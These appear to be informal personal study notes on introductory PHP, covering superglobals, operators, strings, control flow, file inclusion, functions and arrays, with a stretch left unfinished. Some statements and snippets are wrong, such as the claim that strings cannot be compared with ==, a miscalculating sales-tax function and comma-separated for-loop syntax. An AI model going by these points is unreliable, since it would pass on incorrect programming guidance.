	echo "Somevar is $somevar";
}
addit();

Beyond this, PhP has a array that is called $GLOBALS, and we can add the value to said array and interact with it, instead, if we wish, as follows:

$somevar = 15;

function addit(){
	$GLOBALS["somevar"]++;
}

addit();
echo "Somevar is " .$GLOBALS["somevar"];

Beyond this, we also have static variables, which allows us to have the value no matter exiting functions or not. The declaration rule is as per Java, with the static keyword.
What follows, is an example of interacting with a static keyword:

STATIC $somevar;

What follows is an example of a function interaction with a static value:

function keep_track() {
	static $count = 0;
	$count++;
	echo $count;
	echo "<br />"; //Create a new line
}

keep_track();
keep_track();
keep_track();

Assuming we would NOT have a static variable, we would end up with :

1
1
1

Since the variable would be recreated upon each run of the function.

But since it's a Static one, it retains it's instanciation, as per shown:

1
2
3

In PhP, we have some variables that are declared as being SUPERGLOBAL. Superglobal vars are vars that are defined as being relevant to OS, Server, etc.
Some are rendered by the Web Server, some by the PHP, etc.

To showcase the relevant ones that relate to the Web Server and Execution env, we can do the following script:

foreach ($ SERVER as $var => $value ) {
	echo "$var => $value <br />";
}

This would give, for example, the following list, or something akin:

HTTP_HOST => localhost
HTTP_USER_AGENT => Mozilla 5.0 (Windows; U; Windows NT 5.1; en-US; revolves:1.9 1.6)
Gecko/20091201 Firefox/3.5.6 (.NET CLR 3.5.30729) FirePHP/0.3
HTTP_ACCEPT => text/html,application/xhmtl+xml,application/xml;q=0.9,*/*;q=0.8
HTTP_ACCEPT_LANGUAGE => en-us,en;q=0.5
HTTP_ACCEPT_ENCODING => gzip,deflate
HTTP_ACCEPT_CHARSET => ISO-8859-1,utf-8;q=0.7,*;q=0.7
HTTP_KEEP_ALIVE => 300
HTTP_CONNECTION => keep-alive
HTTP_REFERER => http://localhost/chapter03/
HTTP_COOKIE => PHSESSID=205jm6q0lcj867h8p05umfthm7
PATH => C:\php5212\;C:\Ruby\bin;C:\Program Files\Windows Resource Kits\Tools\;C:\WINDOWS\System32\;C:\WINDOWS\;C:\mysql\bin;C:\Program Files\Java\jdk1.6.0_14\bin;
C:\php\PEAR;C\Program Files\GTK2-Runtime\bin;C:\Program Files\jEdit;C:\libxslt\bin;C:\libxml2\bin;C:\apache-ant-1.7.1\bin
SystemRoot => C:\WINDOWS
COMSPEC => C:\WINDOWS\system32\cmd.exe
PATHEXT => .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.RB;.RBW
WINDIR => C\:WINDOWS
SERVER_SIGNATURE =>
SERVER_SOFTWARE => Apache/2.2.11 (Win32) PHP/5.2.12
SERVER_NAME => localHost
SERVER_ADDR => 127.0.0.1
SERVER_PORT => 80
REMOTE_ADDR => 127.0.0.1
DOCUMENT_ROOT => C:/apache/htdocs/beginningphpandmysql_4e
SERVER_ADMIN => admin@localhost
SCRIPT_FILENAME => C:/apache/htdocs/beginningphpandmysql_4e/chapter03/server-superglobal.php
REMOTE_PORT => 4298
GATEWAY_INTERFACE => CGI/1.1
SERVER_PROTOCOL => HTTP/1.1
REQUEST_METHOD => GET
QUERY STRING => 
REQUEST_URI => /chapter03/server-superglobal.php
SCRIPT_NAME => /chapter03/server-superglobal.php
PHP_SELF => /chapter03/server-superglobal.php
REQUEST_TIME => 1262728260

If we wish to find only one of these lines of info, we can specifically access them, as the whole thing is an array:

printf("Your IP address is: %s", $_SERVER['REMOTE_ADDR']);

This returns a numerical IP, such as 192.0.34.166
We can also gain info about the user's OS and browser.

Consider the following one-line:

printf("Your browser is: %s", $_SERVER['HTTP_USER_AGENT']);

This returns information similar to the following:

Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 3.5.30729) FirePHP/0.3

NOTE: To use the predefined variable arrays, the configuration parameter track_vars must be enabled in the php.ini file. As of PHP 4.03, track_vars is always on

In total, there are 9 predefined variable arrays. The above example is only one of 9 Arrays.

The $_SERVER superglobal contains info created by the web server - details regarding the server and client config and the current request environment.
Although the value and number of variables found in $_SERVER varies by server, you can typically expect to find those defined in the CGI 1.1 specification.
You'll like find all of these variables to be quite useful in your app, some of which include the following:

$_SERVER['HTTP_REFERER']: The URL of the page that refered the user to the current location.

$_SERVER['REMOTE_ADDR']: The client's IP Address

$_SERVER['REQUEST_URI']: The path component of the URL. For example if the URL is http://www.example.com/blog/apache/index.html , the URI is
/blog/apache/index.html

$_SERVER['HTTP_USER_AGENT']: The client's user agent, which typically offers information about both the OS and the browser.

The $_GET superglobal contains information pertient to any parameters passed using the GET method. If the URL http://www.example.com/index.html?cat=apache&id=157

We could get the following attributes with the following methods :

$_GET['cat'] = "apache"
$_GET['id'] = "157"

The $_GET superglobal by default is the only way that you can access variables passed via the GET method. You CANNOT reference GET variables, like this:

$cat

$id

The $_POST superglobal contains info about any params using the POST method. Consider the following form, used to solicit subscriber info:

<form action="subscribe.php" method="post">
	<p>
		Email address:<br />
		<input type="text" name="email" size="20" maxlength="50" value="" />
	</p>
	<p>
		Password: <br />
		<input type="password" name="pswd" size="20" maxlength="15" value="" />
	</p>
	<p>
		<input type="submit" name="subscribe" value="subscribe!" />
	</p>
</form>

The following POST vars will be made available via the target subscribe.php script:

$_POST['email'] = "jason@example.com";
$_POST['pswd'] = "rainyday";
$_POST['subscribe'] = "subscribe!";

Like $_GET, the $_POST is the only way to get access to the POST variables. You cannot reference POST variables like $email, $pswd and $subscribe

The $_COOKIE superglobal info passed into the script through HTTP cookies. Such cookies are typically set by a previously executed PhP script
through the PHP function setcookie(). For example, suppose that you use setcookie() to store a cookie named example.com with the value ab2213.
You could later retrieve said value, by virtue of accessing the superglobal Cookie list, as follows:

$_COOKIE["example.com"]

This would allow us to get said value from the cookie.

The $_FILES superglobal contains info regarding data uploaded to the server via the POST method. This superglobal is slightly different
compared to the other ones, because it's a two-dimensional array that contains 5 elements.

The listing of the 5 elements, is as follows:

1 : $_FILES['upload-name']['name']: The name of the file as uploaded from the client to the server

2 : $_FILES['upload-name']['type']: The MIME type of the uploaded file. Whether this variable is assigned depends on the browser capabilities.

3 : $_FILES['upload-name']['size']: The byte size of the uploaded file.

4 : $_FILES['upload-name']['tmp_name']: Once uploaded, the file will be assigned a temporary name before it is moved to it's final location

5 : $_FILES['upload-name']['error']: An upload status code. Despite the name, this gets populated regardless of success or failure.
It can contain 5 different values, as follows:
	UPLOAD_ERR_OK: The file was uploaded successfully

	UPLOAD_ERR_INT_SIZE: The file size exceeds the maximum size imposed by the upload_max_filesize directive

	UPLOAD_ERR_FORM_SIZE: The file size exceeds the maximum size imposed by an optional MAX_FILE_SIZE hidden form file-parameter.

	UPLOAD_ERR_PARTIAL: The file was only partially uploaded.

	UPLOAD_ERR_NO_FILE: A file was not specified in the upload form prompt.

The $_ENV superglobal contains info about the PHP parsers underlying server environment. Some of the vars in this, includes as follows:

$_ENV['HOSTNAME']: the server hostname

$_ENV['SHELL']: The system shell

NOTE: There are two more sets of Superglobals, as follows:

$GLOBALS 

and

$_REQUEST: This one if a catch all, which basically means it sorts all the values from GET, POST and Cookies.
The order of the variables in this, is defined accordingly to the variables_order configuration dir.

The $GLOBALS contains all the variables that are in the global scope.

NOTE: We should not use the two above, since it's not secure to use them.

To retrieve information about sessions, we can access the $_SESSION superglobal. 
This allows us to get information about sessions direclty, instead of passing through GET or POST.

In PhP, we can do a form of variable inception where a variable is a variable, that thus contains two values. 

What follows, is an example of this:

$recipie = "spaghetti"; //Simple format of reference of variable

$$recipie = "& meatballs"; //assign & meatballs to the variable of recipie, which is spahgetti, so spaghetti becomes a variable with & meatballs

echo $recipie $spaghetti; //produces spaghetti & meatballs

echo $recipie ${$recipie}; //also produces spaghetti & meatbals. Here, we refer to the variable that is within the $recipie variable

To define a constant (akin to a final variable or a readonly variable) we can use the define() method, with the general syntax as follows:

boolean define(string name, mixed value [, bool case_insensitive]) //if case_insensitive is set, references to the constant will be case insensitive

What follows, is an example of using a defined constant:

define("PI", 3.141592);

We then later use this variable:

printf("The value of PI is %f", PI);
$pi2 = 2 * PI;
printf("Pi double equals %f", $pi2);

This produces:

The value of pi is 3.141592

Pi double equals 6.283184

NOTE: Constants are global and require no $ to be referenced to.

Expressions in PHP, represents a particular action in a program. All expressions consist of at least one operand and one or more operators. A few examples:

$a = 5; //assign int 5 to a
$a = "5"; //assign string 5 to a
$sum = 50 + $some_int; //assign 50 + the value of $some_int to $sum

$wine = "Zinfandel"; //assign "Zinfandel" to the variable $wine
$inventory++; 		//increment inv by 1

Operans are just the values we operate upon.

Operators in PHP are as follows:

new : Creats a new object instansiation

( ) : Expression subgrouping

[ ] : index enclosure

! ~ ++ -- : Boolean NOT, bitwise NOT, increment, decrement

@ : Error suppression

/ * % : Division, multiplication, modulus

+ - . : Addition, subtraction, concatenation

<< >> : Shift left or right bitwise

< <= > >= : less than, less than or equal to, greater than, greater than or equal o

== != === <> : equal to, not equal to, identical to, is not equal to

& ^ | : bitwise AND, bitwise XOR, bitwise OR

&& || : boolean AND and boolean or

?: 	  : Ternary operator

+ += *= /= .= %= &= |= ^= <<= >>= : Assignment operators

AND XOR Or : Boolean AND, Boolean XOR, Boolean Or

, 		   : Expression seperation

Operator predecence is the same in arithmetics as normal math, as per shown:

$total_cost = $cost + $cost * 0.06 

is the same as

$total_cost = $cost + ($cost * 0.06) //Because of predecence of * > +

Associationwise, arithmetics goes from left to right, and assignment goes right to left. Thus, an example:

$value = 3 * 4 * 5 * 7 * 2;

same as

$value = ((((3 *4) * 5) * 7) * 2);

Whilst assignemnt, it's the opposite:

$c = 5;
print $value = $a = $b = $c;

same as

$c = 5;
$value = ($a = ($b = $c));

Arithmetics are as per usual.

Assigment operators:

as per usual, except for the .= , where we concatenate something unto another. (Such as $a .= 5 , concats 5 to $a's value)

An example of conacatenation in PHP:

$a = "abc"."def"; //Gives abcdef

$a .= "gijkl"; //adds gijkl to the $a value

pre-increment/post-increment and decrement is as per usual

In PHP, we have the normal operators, except for that for !, || and &&, we can simply write them out as: NOT, OR and AND

The difference of the == (equal to) and ===(identical to), is that identical requires a check against the two having the same type, beyond just having the same value.

As far as String comparison goes in PHP, we do not use the == to compare them, we have to resort to other methods.

In terms of quotes regarding string expressions, "" allows for variable expansion, '' does not. This means that "" allows for normal interaction of escape sequences.

Examples:

<?php
	$sport = "boxing";
	echo "Jason's favorite sport is $sport.";
?>

gives

Jason's favorite sport is boxing.

<?php
	$output = "this is one line.\nThis is another.";
	echo $output;
?>

Gives

This is one line.
And this is another line.

NOTE: The output is found in the browser source, rather than the browser window. Browser windows disregard \n chars. 

What follows, is a list of escape sequence chars:

\n 	: New line

\r  : Carriage return

\t  : Horizontal tab

\\  : Backslash

\$  : Dollar sign

\"  : double quote

\[0-7]{1,3} : Octal notation

\x[0-9A-Fa-f]{1,2} : Hexadecimal notation

Example of single string quoting:

print 'This string will $print literally.\n';

Gives

This string will $print literally.\n

To print out more advanced forms of data, such as Arrays or objects, we can specify their designation with {} in a String:

echo "The capital of Ohio is {$capitals['ohio']}.";

In PHP, there is something called Heredoc syntax. This allows for output of large segments of text, by putting them within quotation of 
two identifying points, as follows:

<?php
$website = "http://www.romatermini.it";
echo <<<EXCERPT
<p>Rome's central train station, known as <a href = "$website">Roma Termini</a>, was built in 1867. Because it had fallen into severe disrepair in
the late 20th centruy, the goverment knew that considerable resourecs were required to rehablitate the station prior to the 50-year <i>Giubileo</i>.</p>
EXCERPT;
?>

The EXCERPT parts here, function as arbitrary assignment points of which designates the part to be opening and closing identifiers. It could be any variable
name we please, as long as we follow naming conventions of variables.

The Opening variable, must always be followed by <<<.

" and Heredoc syntax act according to the same rules of variable expansions, the only difference being that " does not need to be escaped 

The closing statement, must be completely seperate on it's line. (As in, no char before it or after it. And it must be the first thing on that line.)

Heredoc syntax is good if you process a lot of text, but don't want to have to escape "" marks.

Beyond this, we have something called Nowdoc. Nowdoc, is the '' equivilant of larger formats, which means we can put code and stuff into it,
without any expansion or execution of said parts , occurs.

PhP supports file-inlcusion in terms of Control structures, which will be shown later.

We have if statements that act akin to Java if's, in PHP:

if (expression){
	//do stuff
}

An example:

<?php
	$secretNumber = 453;
	if ($_POST['guess'] == $secretNumber) {
		echo "<p>Congratulations!</p>";
	}
?>

Much akin to java, if it's a oneline segment, no {} enclosement is needed, as follows:

<?php
	$secretnumber = 453;
	if ($_POST['guess'] == $secretNumber) echo "<p>Congratulations!</p>";
?>

Note: in PHP, it's also valid to replace {} in if's, whiles, for, foreachs, and switch, replacing the start with : and ending with end<condition>; (endif; endwhile; etc.)

Else statements, exist as per usual:

<?php
	$secretNumber = 453;
	if ($_POST['guess'] == $secretnumber) {
		echo "<p>Congratulations!</p>";
	} else{
		echo "<p>Sorry!</p>";
	}
?>

elseif exists as per usual, as well:

<?php
	$secretNumber = 453;
	$_POST['guess'] = 442;
	if ($_POST['guess'] == $secretNumber) {
		echo "<p>Congratulations!</p>";
	} elseif (abs ($_POST['guess']) - $secretNumber < 10){
		echo "<p>You're getting close!</p>";
	} else {
		echo "<p>Sorry!</p>";
	}
?>

We have switch cases, akin to Java, as per usual:

<?php
	switch($category) {
		case "news":
			echo "<p>What's happening around the world</p>";
			break;
		case "weather":
			echo "<p>Your weekly forecast</p>";
			break;
		case "sports":
			echo"<p>Latest sports highlights</p>";
			break;
		default:
			echo "<p>Welcome to my website!<p>";
	}
?>

We have while loops as per usual, with the general syntax as follows:

while (expression){
	//do stuff
}

An example:

<?php
	$count = 1;
	while ($count < 5){
		printf("%d squared = %d <br />", $count, pow($count, 2));
		$count++;
	}
?>

The above, will print out squared numbers.

What follows, is an example of a while loop running until EOF or 5 lines have been printed:

<?php
	$linecount = 1; //start a variable for line count
	$fh = fopen("sports.txt", "r"); //Open a file with reading mode activated
	while (!feof($fh) && $linecount <= 5) { //while we have not reached eof for sports.txt and linecount is less than or equal to 5
		$line = fgets($fh, 4096); //get a line, the 4096 delimeter is ?? so far
		echo $line. "<br />"; //Echo said line and append a newline char in form of br after said line
		$linecount++; //increase linecount
	}
?>

What follows is an example of a do...while statement:

do {
	statements
} while (expressions);

<?php
	$count = 11;
	do {
		printf("%d squared = %d <br />", $count, pow($count,2));
	} while($count < 10);
?>

Executes once, thus, we get :

11 squared = 121

For loops in PhP works a bit differently, and is divided into three parts:

for (expression1, expression2, expression3) { //expression1 is executed by default at the first iteration, expression 2 defines if the loop continues, expression 3
											  //executes at the end of each iteration
	//stuff
}

NOTE: In PHP, any of the expressions, CAN BE EMPTY.

What follows, is a loop that can be writen in 3 different ways, but they all produce teh same output:

Example 1:

for ($kilometers = 1; $kilometers <= 5; $kilometers++) { //standard way of doing for loop
	printf("%d kilometers = %f miles <br />", $kilometers, $kilometers*0.62140); //print out how many kilometers is in miles
}

Example 2:

for ($kilometers = 1; ; $kilometers++) {
	if ($kilometers > 5) break;
	printf("%d kilometers = %f miles <br />", $kilometers, $kilometers*0.62140);
}

Example 3:

$kilometers = 1;
for (;;) {
	if ($kilometers > 5) break;
	printf("%d kilometers = %f miles <br />", $kilometers, $kilometers*0.62140);
	$kilometers++;
}

In PHP, there are two ways we can write foreach loops, where of the first version is as follows:

foreach (array_expr as $value){
	//do something
}

An example of the above syntax:

<?php
	$links = array("www.apress.com", "www.php.net", "www.apache.org");
	echo "<b>Online resources</b>:<br />";
	foreach($links as $link){
		echo "<a href=\"http://$link\">$link</a><br />";
	}
?>

This would return the following:

Online resources:<br />
<a href="http://www.apress.com">http://www.apress.com</a><br /> 
repeat for all following elements

The second variation is good for working with both key and values in terms of arrays. It is as follows:

foreach (array_expr as $key => $value) {
	statement
}

Going back to the previous example, if we were to assume that each element is preceded with a string value of it's title.
We could then use the second format of iterating, to go over said array:

echo "<b>Online Resources</b>:<br />";
foreach ($links as $title => $link){
	echo "<a href=\"http://$link\">$title</a><br />";
}

This would result in the following:

Online Resources: <br />
<a href="http://www.apache.org">The Apache Web Server</a><br />
etc.

break statements are as per usual in PHP. What follows, is an example of using break:

<?php
	$primes = array(2,3,5,7,11,13,17,19,23,29,31,37,41,43,47);
	for($count = 1; $count++; $count < 1000){
		$randomNumber = rand(1,50); //randomNumber is a psuedo random number between 1 and 50
		if (in_array($randomNumber, $primes)){ //in_array is a method calling to check to see if the stated value is in the respective array, akin to the in syntax in Python
			break;
		} else{
			printf("Non-prime number found: %d <br />", $randomNumber);
		}
	}
?>

Furthermore, PhP supports a concept that is called, goto statements - which allows for jumping of positioning to a label, even if said label is outside of the loop, as follows:

<?php
for($count = 0; $count < 10; $count++)
{
	$randomNumber = rand(1,50);

	if ($randomNumber < 10)
		goto less; //goto allows for jumping to label that is outside of loop and can still continue loop iteration
	else
		echo "Number greater than 10: $randomNumber<br />";
}

less:
	echo "Number less than 10: $randomNumber<br />"; //The proceduer to execute if less label was triggered with goto
?>

It will produce the following: 
Number greater than 10: 22
Number greater than 10: 21
Number greater than 10: 35
Number less than 10: 8

We have the normal continue statement in PHP, as to be expected. What follows, is an example:

<?php
	$usernames = array("Grace","Doris","Gary","Nate", "missing", "Tom");
	for ($x=0; $x < count($usernames); $x++) { 	//the count() function in PHP accounts for how many elements a thing has
		if ($username[$x] == "missing") continue;
		printf("Staff member: %s <br />", $usernames[$x]);
	}
?>

The result will print out all names except for missing

Something that is very relevant in programming is ensuring modularity and reusability. A way to ensure this, in PhP, is to
isolate functional components into seperate files and then reasembling 	those files as needed. In PHP, there are 4 ways to do this, as we will be covering in the coming material.

1. include()

The include statement allows us to evaluate a file and include the data from said file to a specific destination. it would be the same as copying the data
and putting it in the destination. it's syntax is as follows:

include(/path/filename) 

A example of including some standalone script into our file, assuming we had written it in a file destination called init.inc.php, we could write as:

<?php
	include "/usr/local/lib/php/wjgilmore/init.inc.php";
?>

This would include the script of init.inc into the script we are calling it from.

When we use include() to include files in terms of conditionals, we MUST designate it to be in {} delimiters, as follows:

<?php
	if (expression) {
		include('file');
	} else{
		include ('Another file');
	}
?>

NOTE: when includin PHP scripts, they must be written as per usual, they cannot omit the <? and ?> delimeters

NOTE: The file getting inherited, gets it's scope to be defined to be the calling script's Scope.

If we enable allow_url_open, we allow for remote files to be included within a include() statement.

If the resident server is PHP-enabled, any variables found in the include file, can be parsed as follows:

include "http://www.wjgilmore.com/index.html?background=blue";

Another version of the include statement, is the include_once (<filename>) format, which works as per include(), just that it
will ONLY include, if it has NOT already been included. Which leads it to be a "safer" (read: excludes multiple inclusions) choise.

Further more, there is a different version of include, called require (<filename>) and require_once() respectively.

the once formats are very useful for not redundantly including things and including variables that might overwrite earlier ones included.

NOTE: A URL can only be used with require(<filename>) only if allow_url_fopen is enabled, which by default it is.

The difference between require and include, is the following:

require causes a file to be included, regardless of it's position in a script. This means that if you put it in a if statement that might fail, it will
still trigger, regardless.

if a require fails : the script will stop execution. (Include does not cease script execution)

One possibility of require failing, is a incorrectly referenced target path.

Any subsequent calls to require, if a require_once(<filename>) has been triggered, is ignored. 

Some examples of functions:

<?php
	$value = pow(5, 3);
	echo $value; //echo the assigned value, this does not forgo assignment
?>

<?php
	echo pow(5,3); //We can forego the principle of value assignment by virtue of just straight up function calling instead of assignment
?>

And what follows are some function calls with concatenation involved:

echo "Five raised to the third power equals "pow(5,3).".";

can also be written as:

printf("Five raised to the third power equals %d.", pow(5,3));

What follows, is a listing of all the current functions of PHP: //NOTE, FIX THIS AT HOME, DUE TO LOW PRESTANDA KEYBOARD

abs() : Absolute value

float acos( float $arg ) : Arc cosine

float acosh( float $arg ) : Inverse hyperbolic cosine

String addcslashes( string $str, string $charlist ) : Quote a string with C style slashes

In terms of creating functions, we generally follow the following syntax:

function functionName(parameters)
{
	//stuff
}

An example:

function generateFooter()
{
	echo "Copyright 2010 W. Jason Gilmore";
}

Can be called with:

<?php
	generateFooter();
?>

Another example of having a function:

function calcSalesTax($price, $tax)
{
	$total = $price + ($price + $tax);
	echo "Total cost: $total";
}

In PHP, there is no type enforcement which means that we can put in values into a Function, without them being the intended type.

In terms of calling functions, we can call them either with pure values or references.

NOTE: Functions need not be defined before you call them, as PHP reads in the entire script into the engine, so long as the function is defined in the script at all

If we were to want to modify a value that is outside of a function, we can do as follows:

<?php
	
	$cost = 20.99;
	$tax = 0.0575;

	function calculateCost(&$cost, $tax) //Note, when we wish to modify stuff outside of the given function, we with the function, we pass reference with a & before it
	{
		$cost = $cost + ($cost * $tax);

		$tax += 4;
	}

	calculateCost($cost, $tax);
	printf("Tax is %01.2f%% ", $tax*100);
	printf("Cost is: $%01.2f", $cost);
?>

ouput is:

Tax is 5.75%
Cost is $22.20

As can be seen from output, $cost changed, but tax remains the same

As per Pythons syntax, we can give default arguments, which makes us able to omit the arguments if we wish, as per follows:

function calcSalesTax($price, $tax=.0675)
{
	$total = $price + ($price * $tax);
	echo "Total cost: $total";
}

Which we can call as follows:

$price = 15.47;
calcSalesTax($price);

Default arguments must appear at the end of the argument list and must be a constant expression. It cannot be a $ reference value or variable.

We can also define optional arguments by setting the default value of it to be a empty string, as follows:

function calcSalesTax($price, $tax="")
{
	$total = $price + ($price * $tax);
	echo "Total cost: $total";
}

An example of calling this, is shown like this:

calcSalesTax(42.00); //The second argument is ommitted and defaulted to 0

If we have multiple optional arguments, we can simply bypass the ones that are optional and that we do not wish to omit, by giving them as a empty string value, as follows:

function calculate($price, $price2="", $price3="")
{
	echo $price + $price2 + $price3;
}

Which can be called as follows:

calculate(10, "", 3);

We can, however, force parameters to be of certain types, if we please, with something called type hinting.

If the provided argument is not according to the type being type hinted, then a fatal error will occur.
Type hinting to scalar types, like int and strings are not supported. 

An example of a type hinting, is as follows:

function processPayPalPayment(Customer $customer){
	//process the customers payment
}

In terms of return, in PHP it works like this : If it gets triggered in the Global environment, it will stop
execution of the entire program.

What follows are to examples of utilizing the return statement:

function calcSalesTax($price, $tax=.0675)
{
	$total = $price + ($price * $tax);
	return $total;
}

We could also just return the calculated value directly:

function calcSalesTax($price, $tax=0.675)
{
	return $price + ($price * $tax);
}

An example of how to call a function:

<?php
	$price = 6.99;
	$total = calcSalesTax($price);
?>

What follows, is a way to assign values from an array to different values, respectively, as is shown with list():

<?php
	$colors = array("red", "blue", "green");
	list($red, $blue, $green) = $colors;
?>

To utilize this in terms of a returned value from a function that has the values, we can do as follows:

<?php
	function retrieveUserProfile()
	{
		$user[] = "Jason Gilmore"; 	//In PHP, this does not override the array, it merely appends it
		$user[] = "jason@example.com"; //Append values to the Array
		$user[] = "English"; //Append
		return $user; //Return the array
	}

	list($name, $email, $language) = retrieveUserProfile(); //Assign the values to each respective attribute from the returned value
	echo "Name: $name, email: $email, language: $language"; //Echo the variables
?>

Executing this script, will yield the following result:

Name: Jason Gilmore, email: jason@example.com, language: English

What follows, is a illustration of a recursive function that acts as a amortization table, as follows:

function amortizationTable($pNum, $periodicPayment, $balance, $monthlyInterest)
{
	//Calculate payment interest

	$paymentInterest = round($balance * monthlyInterest, 2);

	//Calculate payment principal

	$paymentPrincipal = round($periodicPayment - $paymentInterest, 2);

	//Deduct principal from remaining balance
	$newBalance = round($balance - $paymentPrincipal, 2);

	//If new balance < monthly payment, set to 0
	if ($newBalance < $paymentPrincipal) {
		$newBalance = 0;
	}

	printf("<tr><td>%d</td>", $pNum);
	printf("<td>$%s</td>", number_format($newBalance, 2));
	printf("<td>$%s</td>", number_format($periodicPayment, 2));
	printf("<td>$%s</td>", number_format($paymentPrincipal, 2));
	printf("<td>$%s</td></tr>", number_format($paymentInterest, 2));

	if ($newBalance > 0){
		$pNum++;
		amortizationTable($pNum, $periodicPayment, $newBalance, $monthlyInterest);
	} else {
		return 0;
	}
}

What follows, is a function call to the amortizationTable function:

<?php
	//Loan Balance
	$balance = 10000.00;

	//Loan interest rate
	$interestRate = .0575;

	// Monthly interest rate
	$monthlyInterest = $interestRate / 12;

	// Term length of the loan, in years.
	$termLength = 5;

	//Number of payments per year.
	$paymentsPerYear = 12;

	// Payment Iteration
	$paymentNumber = 1;

	//Determine the total number payments
	$totalPayments = $termLength * $paymentsPerYear;

	//Determine interest component of periodic payment
	$intCalc = 1 + $interestRate / $paymentsPerYear;

	//Determine periodic payment
	$periodicPayment = $balance * pow($intCalc, $totalPayments) * ($intCalc - 1) / (pow($intCalc, $totalPayments) - 1);

	//Round periodic payment to two decimals
	$periodicPayment = round($periodicPayment, 2);

	//Create the table
	echo "<table width='50%' align='center' border='1'>"; //Use xml akin syntax to create tables
	echo "<tr>
		  <th>Payment Number</th><th>Balance</th>
		  <th>Payment</th><th>Principal</th><th>Interest</th>
		  </tr>";

	//Call recursive function
	amortizationTable($paymentNumber, $periodicPayment, $balance, $monthlyInterest);

	//Close table
	echo "</table>";
?>

The above code would output a table with Payment number, Loan balance, Payment, principal, Interest and relevant data in each Bracket

Function libraries in PhP, work so that we can save the scripts for later usage. 

However, when we save our scripts on the server, we should not save it within the root dir that would read the script unparsed.
Due to the fact of that this would give people the possibility of gaining the source-code, which contains sensitive data.

To insert the code into scripts, we can use include(), include_once(), require() or require_once().

Or, if we wish to have PhP handle it for us, we can use the PHP's auto_prepend config to automatically insert the file for us.

Assume that we have the above script, named taxation.library.php, we could insert it into a script as follows:

<?php
	require_once("taxation.library.php");
	...
?>

Once included, we can call any of the containing functions, in the script.

In PhP, arrays are akin to Python Dictionaries, in that they have a key and a value.

To allocate each key to a co-responding value, it can be done as follows:

$states = array(0 => "Alabama", 1 => "Alaska"...49 => "Wyoming");

To refer to the respective element, in terms of numerical reference, we could do states[0], as per usual.

In PHP, however, numerical allocation to the key, is not nessecary, at all. We could in fact make the key be a string, as we will see:

$states = array("OH" => "Ohio", "PA" => "Pennsylvania", "NY" => "New York");

We could then reference "Ohio", with the following syntax: states["OH"];

In PHP, we can have multidimensional arrays, which means that we can have arrays made of arrays, as follows:

$states = array (
	"Ohio" => array("population" => "11,353,140", "capital" => "Columbus"),
	"Nebraska" => array("population" => "1,711,263", "capital" => "Omaha")
);

We could then reference for instance Ohios population, by double index references, as follows:

$states["Ohio"]["population"];

This would return:

11,353,140 //The assigned value of the population key of the Ohio Array within the States array

In PHP, when we interact with arrays, we have an array pointer which defines our position in relativity to that array.

In PHP, since it's a loosely typed language, we do not need to specify variables before making references to them or interact with them,
and in the case of Arrays we don't need to specify their size. Fact is, if we wish, we could do like this, out of the blue:

$states[0] = "Delaware";

Which we can display, as per usual:

echo $state[0];

We can then just further map values, if we please, as follows:

$state[1] = "Pensylvania";
$state[2] = "New Jersey";
...
$state[49] = "Hawaii";

We can also "formally", create an array, by the array method, which has the general syntax pattern of which follows:

array array(<item1>,<item2>,etc);

What follows, is an example of using this to create an array:

$languages = array("English", "Gaelic", "Spanish");

We can also use the array formal syntax of creating a associative array, as follows:

$languages = array("Spain" => "Spanish", 
				   "Ireland" => "Gaelic",
				   "United States" => "English");

//This will create an array so that we mapped keys to their respective values.

If we wish to create an array and assign variables at the same time, we can use the list() function call, as we will see
in the following example:

NOTE: The following example asumes we have a txt file named users.txt that contains 3 elements which we are interest of, seperated by |'s

//Open the users.txt file
$users = fopen("users.txt", "r");

//While the EOF has not been reached, get the next line
while ($line = fgets($users, 4096)) {
	
	//We can use the explode() method to seperate each piece of data by the specified delimeter
	list($name, $occupation, $color) = explode("|", $line);

	//format and output the data
	printf("Name: %s <br />", $name);
	printf("Occupation: %s <br />", $occupation);
	printf("Favorite color: %s <br />", $color);
}
fclose($users);

This will ouput the formatted text in the form of:

Name: <blah>
Occupation: <blah>
Favorite Color: <blah>

//Just putting in placeholder value of blah because can't be arsed to write actual values from example

In PHP, we also have the range command from Python, which we can use with the general syntax as follows:

array range(int low, int high, [, int step])

An example is as follows, if we wish to have an array of numbers from 1 to 6, we can do the following:

$die = range(1,6); //By default the step is 1

Another example follows with delimiting a range where we have every even number cited:

$even = range(0, 20, 2);
// $even = array(0, 2, 4, 6...) etc

The range function, in PHP, also allows for having a range of Alphabetical characters, as follows:

$letters = range("A", "F");
// $letters = array("A", "B") etc.

To know wether a variable is an array or not, we can use the is_array() method, which has the general syntax as follows:

boolean is_array(mixed <variable>) - It returns true if something is in the array and false if it isn't

What follows is an example of using the is_array() method:

$states = array("Florida");
$state = "Ohio";
printf("\$states is an array: %s <br />", (is_array($states) ? "TRUE" : "FALSE")); //Use a ternary operator to determine wether the var is an array or not
printf("\$state is an array: %s <br />", (is_array($state) ? "TRUE" : "FALSE")); //Use a terynary operator to determine wether the var is an array or not

What follows is the expected output:

$states is an array: TRUE
$state is an aray: FALSE

If we wish to output the contents of an array, there is a number of ways we could do this, but what follows, is one example of how to do it:

$states = array("Ohio", "Florida", "Texas");
foreach ($states AS $state) {
	echo "{$state}<br />";
}

If we wish to print out an array of arrays, or we need a more exacting format, we could use the vprint() function. 

An example, of using the vprint, follows:

$customers = array(); //Declare a array called Customers
$customers[] = array("Jason Gilmore", "jason@example.com", "614-999-9999");
$customers[] = array("Jesse James", "jesse@example.net", "818-999-9999");
$customers[] = array("Donald Duck", "donald@example.org", "212-999-9999");

foreach ($customers AS $customer) {
	vprintf("<p>Name: %s<br />E-mail: %s<br />Phone: %s</p>", $customer);
}

Executing this code will give the following output:

<p>
Name: Jason Gilmore<br />
E-mail: jason@example.com
<br />Phone: 614-999-9999
</p>
<p>
Name: Jesse James<br />
etc. 


If we'd like to return the formatted output to a string, we could assign it with the vsprintf() function (which means formatted vprint that is sent to a string)

If we'd like to actually display the values in a screen format or to standard_output, we can use the print_r() method, it's general syntax is as follows:

boolean print_r(mixed <variable> [, boolean return])

print_r accepts a input and sends it to standard output, returning TRUE on success and FALSE otherwise.

What print_r does, is that it formats the input variable, so if we have a multidimensional array, we can get it in a readable format, as follows: 
//This assumes we already have the multidimensional array of states since before:

print_r($states);

It will return:

Array ( [Ohio] => Columbus [Iowa] => Des Moines [Arizona] => Phoenix )

If we wish to return the output instead of sending it to standard output, we can set the boolean return to True.

